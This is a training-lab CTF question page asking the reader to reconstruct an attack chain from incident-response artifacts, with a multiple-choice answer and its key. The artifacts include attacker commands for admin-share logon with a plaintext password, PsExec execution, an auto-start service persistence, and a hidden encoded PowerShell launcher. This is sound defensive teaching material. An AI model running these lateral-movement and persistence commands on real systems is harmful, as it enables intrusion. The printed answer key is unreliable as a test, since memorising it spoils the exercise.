![image](/FilesForLabs/images/blueantisyphon.png)

# Hard CTF - Full Persistence Chain

You are performing incident response on a compromised server. You have collected the following artifacts:

**Artifact 1 - PowerShell History**
```
net use \\192.168.1.55\admin$ /user:CORP\svcbackup P@ssw0rd!
psexec \\192.168.1.55 -s cmd.exe
sc \\192.168.1.55 create "WinTelSvc" binpath= "cmd.exe /k C:\ProgramData\wts.bat" start= auto
sc \\192.168.1.55 start WinTelSvc
```

**Artifact 2 - Contents of `wts.bat`**
```batch
@echo off
powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass ^
  -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0...
```

**Artifact 3 - Event Log on 192.168.1.55**
```
Event ID 7045 - New service installed: WinTelSvc
Event ID 4624 - Logon Type 3 (Network) from 192.168.1.20
Event ID 4672 - Special privileges assigned to svcbackup
```

**Artifact 4 - Network capture snippet**
```
192.168.1.55 -> 185.220.101.47:443   [TLS]   repeated every 60s
```

---

## Question

Based on all four artifacts combined, which of the following best describes the full attack chain in the correct order?

---

## Flags (Choose One)

- **A)** Credential theft -> lateral movement via PsExec -> service persistence with encoded payload -> C2 beacon over HTTPS
- **B)** Phishing email -> PowerShell download -> service creation -> data exfiltration over DNS
- **C)** Vulnerability exploit -> privilege escalation -> new service -> lateral movement to a third host
- **D)** Brute force login -> remote command execution -> scheduled task persistence -> C2 over HTTP

---

Correct Flag: **A**

---

# Finished?
[Back to Card's Main Page](/Decks/CORE_v3.1/PE/New_Service_Creation-Modification.md)
